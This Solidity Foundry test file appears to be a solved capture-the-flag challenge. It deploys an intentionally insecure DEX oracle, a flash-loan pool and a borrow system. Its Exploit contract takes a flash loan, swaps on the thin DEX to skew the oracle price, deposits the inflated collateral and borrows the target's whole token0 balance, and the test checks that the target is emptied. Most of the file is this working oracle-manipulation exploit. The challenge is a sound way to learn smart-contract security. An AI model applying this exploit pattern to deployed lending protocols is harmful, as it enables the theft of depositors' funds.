// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
import {BoringToken} from "../src/tokens/tokenBoring.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";

import {FlashLoandReceiverSample} from "./Challenge1.t.sol";

contract Challenge3Test is Test {
    // dex & oracle
    InsecureDexLP private oracleDex;
    // flash loan
    InSecureumLenderPool private flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle private target;

    // insecureum token
    IERC20 private token0;
    // boring token
    IERC20 private token1;

    address private player = makeAddr("player");

    function setUp() public {
        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));

        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0), address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(
            address(oracleDex),
            address(token0),
            address(token1)
        );

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);
        token1.transfer(address(target), 10000 ether);

        vm.label(address(oracleDex), "DEX");
        vm.label(address(flashLoanPool), "FlashloanPool");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "BoringToken");
    }

    function testChallenge() public {
        vm.startPrank(player);

        Exploit attacker = new Exploit(
            address(token0),
            address(token1),
            address(target),
            address(oracleDex),
            address(flashLoanPool)
        );

        attacker.attack();

        vm.stopPrank();

        assertEq(
            token0.balanceOf(address(target)),
            0,
            "You should empty the target contract"
        );
    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract Exploit {
    IERC20 private token0;
    IERC20 private token1;
    BorrowSystemInsecureOracle private borrowSystem;
    InsecureDexLP private dex;
    InSecureumLenderPool private flashLoanPool;

    constructor(
        address _token0,
        address _token1,
        address _borrowSystem,
        address _dex,
        address _flashLoanPool
    ) {
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
        borrowSystem = BorrowSystemInsecureOracle(_borrowSystem);
        dex = InsecureDexLP(_dex);
        flashLoanPool = InSecureumLenderPool(_flashLoanPool);
    }

    function attack() external {
        // approve transfer
        token0.approve(address(dex), type(uint256).max);
        token1.approve(address(dex), type(uint256).max);

        token0.approve(address(borrowSystem), type(uint256).max);
        token1.approve(address(borrowSystem), type(uint256).max);

        // 1 - get tokens from flash loan
        FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();

        flashLoanPool.flashLoan(
            address(_flashLoanReceiver),
            abi.encodeWithSignature("receiveFlashLoan(address)", address(this))
        );

        uint256 token0CurrentBalance = token0.balanceOf(address(this));

        // 2 - switch token0 for token1 on lp
        dex.swap(address(token0), address(token1), token0CurrentBalance);

        uint256 token1CurrentBalance = token1.balanceOf(address(this));

        // 3 - deposit token1 on borrow system
        borrowSystem.depositToken1(token1CurrentBalance);

        // 4 - get all token0 from borrow system
        borrowSystem.borrowToken0(token0.balanceOf(address(borrowSystem)));
    }
}
